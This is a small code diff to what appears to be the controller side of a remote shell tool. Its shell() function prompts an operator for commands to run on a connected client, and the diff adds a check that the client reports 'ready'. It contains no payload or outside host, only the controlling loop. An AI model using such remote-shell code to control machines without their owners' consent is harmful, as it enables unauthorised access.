@@ -24,7 +24,12 @@ def get_client_path():
     return server_session.recv(1024).decode('utf-8')
 
 def shell():
+    status = server_session.recv(1024).decode('utf-8')
+    if status != "ready":
+        print("Client Not Ready")
+        return
     path = get_client_path()
+
     while len(path) and path != "clientdisconnected":
         command = input(f"{path}> ").strip()
         if command == "exit":
